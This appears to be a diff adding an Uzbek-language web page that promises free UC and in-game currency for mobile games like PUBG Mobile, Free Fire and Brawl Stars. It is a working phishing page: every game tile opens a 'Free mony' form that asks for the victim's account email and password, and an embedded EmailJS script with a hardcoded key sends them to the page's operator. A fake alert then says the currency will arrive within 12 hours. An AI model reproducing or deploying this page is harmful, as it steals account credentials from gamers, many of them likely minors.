@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uces</title>
+    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css
+    ">
+</head>
+<body style="background-color: #eee;">
+<br><br>
+
+    <h2 style="text-align: center;">Quyidagilardan birini tanglang!  <br>
+        Free fire, clash of clans,  Pubg mobile, <br> Hay day, Brawl Stars, Pubg Korea, Clash royale, subway surfers
+ 
+</h2>
+    <br><br><br><br>
+    
+
+    <div style="display: flex; justify-content: center;" id="resp">
+    
+        <div id="hoveruchun"  data-bs-toggle="modal" data-bs-target="#exampleModal">
+            <img width="250px" src="../img/freefire.jpeg" alt="">
+            <h2>Free fire</h2>
+        </div>
+        
+        <div id="hoveruchun"  data-bs-toggle="modal" data-bs-target="#exampleModal">
+            <img width="250px" src="../img/clash.jpg" alt="">
+            <h2>clash of clans</h2>
+        </div>
+        
+        </div>
+<br><br>
+<div style="display: flex; justify-content: center;" id="resp">
+    
+    <div id="hoveruchun"  data-bs-toggle="modal" data-bs-target="#exampleModal">
+        <img width="250px" src="../img/boshqismi us.png" alt="">
+        <h2>Pubg mobile</h2>
+    </div>
+    
+    <div id="hoveruchun"  data-bs-toggle="modal" data-bs-target="#exampleModal">
+        <img width="250px" height="141px" src="../img/hay day.webp" alt="">
+        <h2>Hay day</h2>
+    </div>
+    
+    </div>
+
+<br><br>
+
+
+
+<div style="display: flex; justify-content: center;" id="resp">
+   
+<div id="hoveruchun"  data-bs-toggle="modal" data-bs-target="#exampleModal">
+    <img width="250px" src="../img/brawl stars.jpg" alt="">
+    <h2>Brawl Stars</h2>
+</div>
+
+<div id="hoveruchun"  data-bs-toggle="modal" data-bs-target="#exampleModal">
+    <img width="250px" src="../img/pubg korea.jpg" alt="">
+    <h2>Pubg Korea</h2>
+</div>
+    </div>
+<br><br><br>
+    <div style="display: flex; justify-content: center;" id="resp">
+        
+        <div id="hoveruchun"  data-bs-toggle="modal" data-bs-target="#exampleModal">
+            <img width="250px" src="../img/clash royale.jpg" alt="">
+            <h2>Clash royale</h2>
+        </div>
+        
+        <div id="hoveruchun" data-bs-toggle="modal" data-bs-target="#exampleModal">
+            <img width="250px" height="141px" src="../img/subway suf.jpg" alt="">
+            <h2>subway surfers</h2>
+        </div>
+        
+        </div>
+
+     <!-- ////////////////////////// -->
+     <style>
+        .field {
+      margin-bottom: 10px;
+    }
+    
+    .field label {
+      display: block;
+      font-size: 12px;
+      color: #777;
+    }
+    
+    .field input {
+      display: block;
+      min-width: 250px;
+      line-height: 1.5;
+      font-size: 14px;
+    }
+    
+    input[type="submit"] {
+      display: block;
+      padding: 6px 30px;
+      font-size: 14px;
+      background-color: #4460AA;
+      color: #fff;
+      border: none
+    }
+    </style>
+  
+  <!-- Modal -->
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h1 class="modal-title fs-5" id="exampleModalLabel">Free mony</h1>
+          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+        </div>
+        <div class="modal-body">
+          
+
+
+
+
+            <form id="form">
+                <div class="field">
+                  <label for="from_name"></label>
+                  <input type="number" name="from_name" id="from_name" placeholder="Id" required >
+                </div>
+                <div class="field">
+                    <label for="email"></label>
+                   <!-- ism chiqaradi -->
+
+<input list="bow" name="email" id="email" placeholder="Google Yoki Fackebook">
+<datalist id="bow">
+    <option value="google"></option>
+    <option value="Fackebook"></option>
+</datalist>
+
+<!-- ism tugadi -->
+
+                  </div>
+                <div class="field">
+                  <label for="email"></label>
+                  <input type="text" name="email" id="email" placeholder="email" required>
+                </div>
+                <div class="field">
+                  <label for="password"></label>
+                  <input type="text" name="password" id="password" placeholder="password" required>
+                </div>
+                <div class="field">
+                  <label for="reply_to"></label>
+                  <input type="text" name="reply_to" id="reply_to" value="60" readonly>
+                </div>
+              
+                <input type="submit" id="button" value="Free Uc send" >
+              </form>
+              
+              <script type="text/javascript"
+                src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+              
+              <script type="text/javascript">
+                emailjs.init('bCJmyOKjZm1ARK7_z')
+              </script>
+
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<script>
+const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Free uc sending...';
+
+   const serviceID = 'default_service';
+   const templateID = 'template_uchcmuf';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Free uc';
+      alert('Uc 12 soat ichida tushiriladi, uc tushmasa qayta urinib koring! Uc jonatildi 240 soatdan song yana jonata olasiz');
+    }, (err) => {
+      btn.value = 'Free uc';
+      alert(JSON.stringify(err));
+    });
+});
+</script>
+
+
+<!-- /////////////////////////// -->
+<br><br><br><br><br>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js
+"></script>
+</body>
+</html>
